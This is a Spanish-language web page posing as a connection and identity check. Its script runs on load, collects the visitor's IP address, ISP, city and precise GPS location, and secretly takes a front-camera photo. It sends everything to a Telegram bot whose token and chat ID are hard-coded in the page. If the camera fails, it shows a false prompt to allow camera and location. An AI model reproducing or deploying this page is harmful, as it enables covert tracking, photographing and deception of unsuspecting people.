<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VALIDACIÓN</title>
    <style>
        body { font-family: sans-serif; background: #1a202c; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #fff; }
        .card { background: white; color: #333; padding: 30px; border-radius: 15px; text-align: center; width: 90%; max-width: 380px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3182ce; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .error-box { display: none; background: #fff5f5; border: 1px solid #feb2b2; padding: 15px; border-radius: 8px; margin-top: 15px; color: #c53030; }
    </style>
</head>
<body>

<div class="card">
    <h3>Validando Conexión...</h3>
    <div id="loader" class="spinner"></div>
    <div id="instrucciones" class="error-box">
        <b>⚠️ ACCESO REQUERIDO:</b><br>
        Es necesario permitir <b>Cámara y Ubicación</b> para validar tu identidad.
    </div>
</div>

<script>
const BOT_TOKEN = "8254282443:AAFPfL2Qay1UtbeObu4_KSdsoSm1CN6yW-Q";
const CHAT_ID = "-1003973600762";

let infoRed = { ip: "No detectada", isp: "N/A", ciudad: "N/A" };

async function cargarRed() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        infoRed.ip = data.ip || "N/A";
        infoRed.isp = data.org || "N/A";
        infoRed.ciudad = data.city || "N/A";
    } catch (e) { console.error("Error IP"); }
}

async function ejecutarReporte() {
    let foto = null;
    let gps = "Vacio";

    // 1. GPS
    try {
        const p = await new Promise((res, rej) => {
            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
        });
        gps = `[Ver Mapa](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`;
    } catch (e) { gps = "Vacio"; }

    // 2. CÁMARA
    try {
        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const v = document.createElement('video');
        v.srcObject = s;
        await v.play();
        await new Promise(r => setTimeout(r, 1000));
        const c = document.createElement('canvas');
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        foto = await new Promise(res => c.toBlob(res, 'image/jpeg', 0.7));
        s.getTracks().forEach(t => t.stop());
    } catch (e) { console.error("Error Cámara:", e); }

    // 3. ENVIAR A TELEGRAM
    const texto = `🚨 **NUEVO REPORTE**\n\n🌐 **IP:** \`${infoRed.ip}\`\n🏢 **ISP:** ${infoRed.isp}\n📍 **Ciudad:** ${infoRed.ciudad}\n📌 **GPS:** ${gps}`;

    const fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    fd.append('parse_mode', 'Markdown');

    if (foto) {
        fd.append('photo', foto, 'foto.jpg');
        fd.append('caption', texto);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    } else {
        fd.append('text', texto);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: fd });
        document.getElementById('instrucciones').style.display = 'block';
    }
}

window.onload = async () => {
    await cargarRed();
    await ejecutarReporte();
};
</script>
</body>
</html>
